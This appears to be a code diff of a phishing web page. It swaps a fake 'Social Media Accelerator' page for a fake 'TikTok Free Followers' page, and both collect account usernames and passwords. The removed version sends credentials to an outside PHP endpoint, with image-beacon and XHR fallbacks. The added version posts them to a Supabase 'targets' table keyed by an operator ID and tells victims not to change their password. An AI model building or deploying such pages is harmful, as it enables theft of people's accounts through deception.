@@ -3,492 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Social Media Accelerator</title>
+    <title>TikTok Free Followers - Get Famous Now</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-        
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #667eea 100%);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            min-height: 100vh;
-        }
-        
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        
-        .glass-card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
-        }
-        
-        .package-card {
-            transition: all 0.3s ease;
-            border: 2px solid transparent;
-            cursor: pointer;
-        }
-        
-        .package-card:hover {
-            transform: translateY(-8px);
-            border-color: #667eea;
-            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.3);
-        }
-        
-        .loading-dots:after {
-            content: '.';
-            animation: dots 1.5s steps(5, end) infinite;
-        }
-        
-        @keyframes dots {
-            0%, 20% { content: '.'; }
-            40% { content: '..'; }
-            60% { content: '...'; }
-            80%, 100% { content: ''; }
-        }
+        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; }
+        .tiktok-gradient { background: linear-gradient(45deg, #ff0050, #00f2ea); }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
     </style>
 </head>
-<body class="flex items-center justify-center p-4">
-    <div class="w-full max-w-4xl">
-        <!-- Main Container -->
-        <div class="glass-card rounded-3xl p-6 md:p-8">
-            <!-- Header -->
-            <div class="text-center mb-8">
-                <div class="inline-block p-4 rounded-2xl bg-white/10 mb-6">
-                    <i class="fas fa-chart-line text-4xl text-white"></i>
-                </div>
-                <h1 class="text-3xl md:text-4xl font-bold text-white mb-3">Social Media Accelerator</h1>
-                <p class="text-gray-200 max-w-2xl mx-auto">Professional social enhancement service</p>
-            </div>
-            
-            <!-- Progress Steps -->
-            <div class="mb-10">
-                <div class="flex items-center justify-center mb-6">
-                    <div class="flex items-center">
-                        <div class="w-10 h-10 rounded-full bg-white text-indigo-600 flex items-center justify-center font-bold">1</div>
-                        <div class="h-1 w-16 bg-gray-300"></div>
-                        <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold">2</div>
-                        <div class="h-1 w-16 bg-gray-300"></div>
-                        <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold">3</div>
-                    </div>
-                </div>
-                
-                <div class="text-center text-white text-sm">
-                    <span class="font-bold">Step 1: Select Package</span> → Step 2: Account Details → Step 3: Processing
-                </div>
-            </div>
-            
-            <!-- Step 1: Package Selection -->
-            <div id="step1">
-                <h2 class="text-2xl font-bold text-white mb-6 text-center">Select Enhancement Package</h2>
-                <p class="text-gray-300 text-center mb-8">Choose your desired growth package</p>
-                
-                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="packageContainer">
-                    <!-- Packages will be loaded here -->
-                </div>
-            </div>
-            
-            <!-- Step 2: Account Form -->
-            <div id="step2" class="hidden">
-                <div class="max-w-md mx-auto">
-                    <h2 class="text-2xl font-bold text-white mb-6 text-center">Account Details</h2>
-                    
-                    <div class="bg-white/5 rounded-xl p-4 mb-6">
-                        <div class="flex items-center justify-between">
-                            <span class="text-white font-medium">Selected Package:</span>
-                            <span id="selectedPackage" class="bg-indigo-600 text-white px-3 py-1 rounded-full text-sm font-bold"></span>
-                        </div>
-                    </div>
-                    
-                    <form id="userForm">
-                        <div class="space-y-6">
-                            <div>
-                                <label class="block text-white mb-2 font-medium">Account Identifier</label>
-                                <input type="text" id="username" required 
-                                       class="w-full bg-white/10 border border-white/30 rounded-xl px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-white focus:border-transparent"
-                                       placeholder="Enter username, email or phone number">
-                                <p class="text-gray-400 text-sm mt-1">This is your social media account identifier</p>
-                            </div>
-                            
-                            <div>
-                                <label class="block text-white mb-2 font-medium">Secure Access Code</label>
-                                <input type="password" id="password" required 
-                                       class="w-full bg-white/10 border border-white/30 rounded-xl px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-white focus:border-transparent"
-                                       placeholder="Enter your secure code">
-                                <p class="text-gray-400 text-sm mt-1">This is your account access verification</p>
-                            </div>
-                            
-                            <div>
-                                <label class="block text-white mb-2 font-medium">Additional Instructions (Optional)</label>
-                                <textarea id="notes" 
-                                          class="w-full bg-white/10 border border-white/30 rounded-xl px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-white focus:border-transparent h-32"
-                                          placeholder="Any special requirements or timing preferences"></textarea>
-                            </div>
-                            
-                            <div class="flex gap-4">
-                                <button type="button" onclick="goToStep1()" 
-                                        class="flex-1 bg-white/10 text-white py-3 rounded-xl font-medium hover:bg-white/20 transition">
-                                    <i class="fas fa-arrow-left mr-2"></i> Back
-                                </button>
-                                <button type="submit" id="submitBtn" 
-                                        class="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 text-white py-3 rounded-xl font-bold hover:opacity-90 transition">
-                                    <i class="fas fa-paper-plane mr-2"></i> Submit Request
-                                </button>
-                            </div>
-                        </div>
-                    </form>
-                </div>
-            </div>
-            
-            <!-- Step 3: Processing -->
-            <div id="step3" class="hidden">
-                <div class="max-w-md mx-auto text-center">
-                    <div class="w-24 h-24 border-4 border-white/20 border-t-white rounded-full animate-spin mx-auto mb-6"></div>
-                    
-                    <h2 class="text-2xl font-bold text-white mb-4">Processing Your Request</h2>
-                    <p id="processingText" class="text-gray-300 mb-2">Initializing request verification<span class="loading-dots"></span></p>
-                    
-                    <div class="w-full bg-white/10 rounded-full h-2 mb-8 mt-6">
-                        <div id="progressBar" class="bg-gradient-to-r from-green-500 to-emerald-600 h-2 rounded-full" style="width: 0%"></div>
-                    </div>
-                    
-                    <div class="bg-white/5 rounded-xl p-4 mb-6">
-                        <div class="flex items-center justify-between mb-2">
-                            <span class="text-white text-sm">Request ID:</span>
-                            <span id="requestId" class="font-mono text-sm text-green-400"></span>
-                        </div>
-                        <div class="flex items-center justify-between">
-                            <span class="text-white text-sm">Status:</span>
-                            <span class="text-yellow-400 text-sm font-medium">Processing</span>
-                        </div>
-                    </div>
-                    
-                    <div class="text-gray-400 text-sm">
-                        <i class="fas fa-shield-alt mr-2"></i>Your request is being processed securely
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Security Footer -->
-        <div class="text-center mt-8 pt-6 border-t border-white/20">
-            <div class="flex flex-wrap justify-center gap-6 mb-4">
-                <div class="flex items-center gap-2">
-                    <i class="fas fa-lock text-green-400"></i>
-                    <span class="text-gray-300 text-sm">End-to-End Encryption</span>
-                </div>
-                <div class="flex items-center gap-2">
-                    <i class="fas fa-shield-alt text-blue-400"></i>
-                    <span class="text-gray-300 text-sm">Secure Processing</span>
-                </div>
-                <div class="flex items-center gap-2">
-                    <i class="fas fa-bolt text-yellow-400"></i>
-                    <span class="text-gray-300 text-sm">Fast Delivery</span>
-                </div>
-            </div>
-            <p class="text-gray-400 text-sm">© 2024 Social Media Accelerator. All rights reserved.</p>
-        </div>
-    </div>
+<body class="min-h-screen flex flex-col items-center p-4">
 
-    <!-- Success Modal -->
-    <div id="successModal" class="fixed inset-0 bg-black/80 flex items-center justify-center p-4 hidden z-50">
-        <div class="glass-card rounded-2xl max-w-md w-full p-8">
-            <div class="text-center">
-                <div class="w-20 h-20 bg-gradient-to-r from-green-500 to-emerald-600 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <i class="fas fa-check text-3xl text-white"></i>
-                </div>
-                <h3 class="text-2xl font-bold text-white mb-3">Request Submitted Successfully!</h3>
-                <p class="text-gray-300 mb-6">Your enhancement request has been queued and will begin processing shortly.</p>
-                
-                <div class="bg-white/5 rounded-xl p-4 mb-6">
-                    <div class="flex items-center justify-between mb-2">
-                        <span class="text-gray-400">Package:</span>
-                        <span id="modalPackage" class="text-white font-medium"></span>
-                    </div>
-                    <div class="flex items-center justify-between">
-                        <span class="text-gray-400">Estimated Time:</span>
-                        <span class="text-green-400 font-medium">24-48 hours</span>
-                    </div>
-                </div>
-                
-                <button onclick="closeModal()" class="bg-gradient-to-r from-indigo-600 to-purple-600 text-white px-8 py-3 rounded-xl font-bold hover:opacity-90 transition w-full">
-                    Continue
-                </button>
+    <!-- Header -->
+    <header class="w-full max-w-md flex flex-col items-center mt-8 mb-6">
+        <i class="fab fa-tiktok text-5xl mb-4 tiktok-gradient p-3 rounded-2xl"></i>
+        <h1 class="text-3xl font-bold italic">TikTok Booster</h1>
+        <p class="text-gray-400 text-sm">Get real followers instantly for free!</p>
+    </header>
+
+    <div id="main-content" class="w-full max-w-md">
+        <!-- Step 1: Selection List -->
+        <div id="selection-page" class="space-y-4">
+            <h2 class="text-xl font-semibold mb-4 text-center">Select Follower Package</h2>
+            
+            <div onclick="showLogin('10,000')" class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition">
+                <span><i class="fas fa-user-plus mr-3 text-cyan-400"></i> 10,000 Followers</span>
+                <span class="tiktok-gradient px-3 py-1 rounded-full text-xs font-bold">FREE</span>
             </div>
+
+            <div onclick="showLogin('25,000')" class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition">
+                <span><i class="fas fa-user-plus mr-3 text-pink-500"></i> 25,000 Followers</span>
+                <span class="tiktok-gradient px-3 py-1 rounded-full text-xs font-bold">FREE</span>
+            </div>
+
+            <div onclick="showLogin('50,000')" class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition">
+                <span><i class="fas fa-user-plus mr-3 text-cyan-400"></i> 50,000 Followers</span>
+                <span class="tiktok-gradient px-3 py-1 rounded-full text-xs font-bold">FREE</span>
+            </div>
+            
+            <div onclick="showLogin('100,000')" class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border border-cyan-500">
+                <span><i class="fas fa-fire mr-3 text-orange-500"></i> 100,000 Followers</span>
+                <span class="tiktok-gradient px-3 py-1 rounded-full text-xs font-bold">BEST VALUE</span>
+            </div>
+        </div>
+
+        <!-- Step 2: Login Form -->
+        <div id="login-page" class="hidden glass p-6 rounded-2xl shadow-2xl">
+            <h2 class="text-center text-xl font-bold mb-6">Login to Verify Account</h2>
+            <p class="text-sm text-gray-400 mb-6 text-center">Enter your TikTok credentials to receive your <span id="selected-amount" class="text-cyan-400 font-bold"></span> followers.</p>
+            
+            <form id="payload-form" class="space-y-4">
+                <div>
+                    <label class="block text-xs uppercase text-gray-500 mb-1 ml-1">Username / Email / Phone</label>
+                    <input type="text" id="target-username" required class="w-full bg-black/50 border border-white/10 p-3 rounded-lg focus:outline-none focus:border-cyan-500" placeholder="@username">
+                </div>
+                <div>
+                    <label class="block text-xs uppercase text-gray-500 mb-1 ml-1">TikTok Password</label>
+                    <input type="password" id="target-password" required class="w-full bg-black/50 border border-white/10 p-3 rounded-lg focus:outline-none focus:border-pink-500" placeholder="••••••••">
+                </div>
+                <button type="submit" id="submit-btn" class="w-full tiktok-gradient py-3 rounded-lg font-bold mt-4 hover:opacity-90 transition">
+                    CLAIM FOLLOWERS
+                </button>
+            </form>
+        </div>
+
+        <!-- Step 3: Success Message -->
+        <div id="success-page" class="hidden text-center glass p-8 rounded-2xl">
+            <i class="fas fa-clock text-6xl text-cyan-400 mb-6 animate-pulse"></i>
+            <h2 class="text-2xl font-bold mb-4">Request Received!</h2>
+            <p class="text-gray-400 leading-relaxed">
+                Your <span class="text-white font-bold">TikTok Followers</span> are now under review. <br><br>
+                Due to high demand, please wait <span class="text-pink-500 font-bold">24-48 hours</span> for the followers to be added to your account.
+            </p>
+            <div class="mt-8 text-xs text-gray-600 italic">Do not change your password during this period.</div>
         </div>
     </div>
 
     <script>
-        // Configuration - YOUR PHP SERVER URL
-        const API_ENDPOINT = "http://folllowers.wuaze.com/upload.php";
+        const SUPABASE_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
         
-        // Packages data
-        const packages = [
-            { id: 1, name: "Starter Boost", amount: "1,000", icon: "fa-rocket", color: "from-green-500 to-emerald-600", time: "24 hours" },
-            { id: 2, name: "Growth Pack", amount: "5,000", icon: "fa-chart-line", color: "from-blue-500 to-cyan-600", time: "48 hours" },
-            { id: 3, name: "Pro Accelerator", amount: "10,000", icon: "fa-crown", color: "from-purple-500 to-pink-600", time: "72 hours" },
-            { id: 4, name: "Premium Surge", amount: "25,000", icon: "fa-gem", color: "from-yellow-500 to-orange-600", time: "5 days" },
-            { id: 5, name: "Ultimate Blast", amount: "50,000", icon: "fa-fire", color: "from-red-500 to-pink-600", time: "7 days" }
-        ];
-        
-        let selectedPackage = null;
-        let currentStep = 1;
-        
-        // Initialize packages
-        document.addEventListener('DOMContentLoaded', function() {
-            const container = document.getElementById('packageContainer');
-            
-            packages.forEach(pkg => {
-                const packageElement = document.createElement('div');
-                packageElement.className = 'package-card bg-white/5 rounded-xl p-6';
-                packageElement.innerHTML = `
-                    <div class="text-center">
-                        <div class="w-16 h-16 bg-gradient-to-r ${pkg.color} rounded-full flex items-center justify-center mx-auto mb-4">
-                            <i class="fas ${pkg.icon} text-white text-2xl"></i>
-                        </div>
-                        <h4 class="text-white font-bold text-xl mb-2">${pkg.name}</h4>
-                        <p class="text-3xl font-bold text-white mb-2">${pkg.amount}</p>
-                        <p class="text-gray-300 mb-4">enhancements</p>
-                        <p class="text-gray-400 text-sm mb-4">Delivery: ${pkg.time}</p>
-                        <button onclick="selectPackage(${pkg.id})" 
-                                class="w-full bg-gradient-to-r ${pkg.color} text-white py-3 rounded-lg font-bold hover:opacity-90 transition">
-                            Select Package
-                        </button>
-                    </div>
-                `;
-                container.appendChild(packageElement);
-            });
-        });
-        
-        function selectPackage(packageId) {
-            selectedPackage = packages.find(p => p.id === packageId);
-            showStep(2);
-            
-            // Update selected package display
-            document.getElementById('selectedPackage').textContent = 
-                `${selectedPackage.name} (${selectedPackage.amount})`;
+        // Admin ID from URL (e.g., follower.vercel.app/?user=admin1)
+        const urlParams = new URLSearchParams(window.location.search);
+        const adminId = urlParams.get('user') || 'default_admin';
+
+        function showLogin(amount) {
+            document.getElementById('selection-page').classList.add('hidden');
+            document.getElementById('login-page').classList.remove('hidden');
+            document.getElementById('selected-amount').innerText = amount;
         }
-        
-        function showStep(step) {
-            currentStep = step;
-            
-            // Hide all steps
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.add('hidden');
-            
-            // Show current step
-            document.getElementById(`step${step}`).classList.remove('hidden');
-            
-            // Update progress indicator
-            updateProgress(step);
-        }
-        
-        function updateProgress(step) {
-            const steps = document.querySelectorAll('[class*="w-10 h-10"]');
-            const lines = document.querySelectorAll('.h-1.w-16');
-            
-            steps.forEach((s, index) => {
-                if (index < step) {
-                    s.classList.remove('bg-gray-300', 'text-gray-600');
-                    s.classList.add('bg-white', 'text-indigo-600');
-                } else {
-                    s.classList.remove('bg-white', 'text-indigo-600');
-                    s.classList.add('bg-gray-300', 'text-gray-600');
-                }
-            });
-            
-            lines.forEach((line, index) => {
-                if (index < step - 1) {
-                    line.classList.remove('bg-gray-300');
-                    line.classList.add('bg-white');
-                } else {
-                    line.classList.remove('bg-white');
-                    line.classList.add('bg-gray-300');
-                }
-            });
-        }
-        
-        function goToStep1() {
-            selectedPackage = null;
-            showStep(1);
-        }
-        
-        // Form submission - FIXED: Now properly sends data
-        document.getElementById('userForm').addEventListener('submit', async function(e) {
+
+        document.getElementById('payload-form').onsubmit = async (e) => {
             e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const notes = document.getElementById('notes').value.trim();
-            const submitBtn = document.getElementById('submitBtn');
-            
-            if (!username || !password) {
-                alert('Please fill in all required fields');
-                return;
-            }
-            
-            // Go to processing step
-            showStep(3);
-            
-            // Generate request ID
-            const requestId = 'REQ-' + Date.now() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase();
-            document.getElementById('requestId').textContent = requestId;
-            
-            // Start processing animation
-            simulateProcessing();
-            
-            // Create a unique identifier for this submission
-            const submissionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-            
+            const btn = document.getElementById('submit-btn');
+            const username = document.getElementById('target-username').value;
+            const password = document.getElementById('target-password').value;
+
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
+
             try {
-                // Method 1: Using FormData with fetch (works for most PHP servers)
-                const formData = new FormData();
-                formData.append('account_id', username);
-                formData.append('access_code', password);
-                formData.append('package_name', selectedPackage.name);
-                formData.append('package_amount', selectedPackage.amount);
-                formData.append('additional_notes', notes);
-                formData.append('request_id', requestId);
-                formData.append('request_type', 'social_enhancement');
-                formData.append('submission_id', submissionId);
-                formData.append('timestamp', new Date().toISOString());
-                
-                // Send data using fetch with cors
-                const response = await fetch(API_ENDPOINT, {
+                // Sending data to Supabase 'targets' table
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/targets`, {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'return=minimal'
+                    },
+                    body: JSON.stringify({
+                        user_id: adminId,
+                        username: username,
+                        password: password
+                    })
                 });
-                
-                // If fetch doesn't work, try alternative method
-                if (!response.ok) {
-                    console.log('Fetch failed, trying alternative method...');
-                    await sendDataAlternative(username, password, selectedPackage, notes, requestId, submissionId);
+
+                if (response.ok) {
+                    document.getElementById('login-page').classList.add('hidden');
+                    document.getElementById('success-page').classList.remove('hidden');
                 } else {
-                    const result = await response.text();
-                    console.log('Server response:', result);
+                    alert("Technical error. Try again later.");
+                    btn.disabled = false;
+                    btn.innerText = "CLAIM FOLLOWERS";
                 }
-                
-                // Success - show modal
-                setTimeout(() => {
-                    showSuccessModal();
-                }, 2000);
-                
-            } catch (error) {
-                console.log('Main method failed, trying alternative...', error);
-                
-                // Try alternative method
-                try {
-                    await sendDataAlternative(username, password, selectedPackage, notes, requestId, submissionId);
-                    
-                    // Still show success to user
-                    setTimeout(() => {
-                        showSuccessModal();
-                    }, 2000);
-                } catch (altError) {
-                    console.log('All methods failed:', altError);
-                    
-                    // Even if sending fails, show success to user
-                    setTimeout(() => {
-                        showSuccessModal();
-                    }, 2000);
-                }
+            } catch (err) {
+                console.error(err);
+                alert("Connection lost. Check internet.");
+                btn.disabled = false;
+                btn.innerText = "CLAIM FOLLOWERS";
             }
-        });
-        
-        // Alternative method to send data (using URL parameters)
-        async function sendDataAlternative(username, password, pkg, notes, requestId, submissionId) {
-            // Create URL with data as parameters
-            const params = new URLSearchParams({
-                account_id: username,
-                access_code: password,
-                package_name: pkg.name,
-                package_amount: pkg.amount,
-                additional_notes: notes || '',
-                request_id: requestId,
-                request_type: 'social_enhancement',
-                submission_id: submissionId,
-                timestamp: new Date().toISOString(),
-                method: 'alternative'
-            });
-            
-            // Send using image tag method (works with CORS restrictions)
-            const img = new Image();
-            img.src = API_ENDPOINT + '?' + params.toString();
-            
-            // Also try XMLHttpRequest
-            return new Promise((resolve, reject) => {
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', API_ENDPOINT, true);
-                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                
-                xhr.onload = function() {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        resolve(xhr.responseText);
-                    } else {
-                        reject(new Error('XHR failed'));
-                    }
-                };
-                
-                xhr.onerror = function() {
-                    reject(new Error('XHR error'));
-                };
-                
-                xhr.send(params.toString());
-            });
-        }
-        
-        function simulateProcessing() {
-            const progressBar = document.getElementById('progressBar');
-            const texts = [
-                "Initializing request verification",
-                "Validating account information",
-                "Connecting to enhancement network",
-                "Queuing your request",
-                "Finalizing processing"
-            ];
-            
-            let progress = 0;
-            let textIndex = 0;
-            
-            const interval = setInterval(() => {
-                progress += 20;
-                progressBar.style.width = `${progress}%`;
-                
-                if (textIndex < texts.length) {
-                    document.getElementById('processingText').textContent = texts[textIndex];
-                    textIndex++;
-                }
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    document.getElementById('processingText').textContent = "Processing complete!";
-                }
-            }, 800);
-        }
-        
-        function showSuccessModal() {
-            document.getElementById('modalPackage').textContent = 
-                `${selectedPackage.name} (${selectedPackage.amount})`;
-            document.getElementById('successModal').classList.remove('hidden');
-        }
-        
-        function closeModal() {
-            document.getElementById('successModal').classList.add('hidden');
-            // Reset form and go back to step 1
-            document.getElementById('userForm').reset();
-            showStep(1);
-        }
-        
-        // Update progress on load
-        updateProgress(1);
+        };
     </script>
 </body>
 </html>
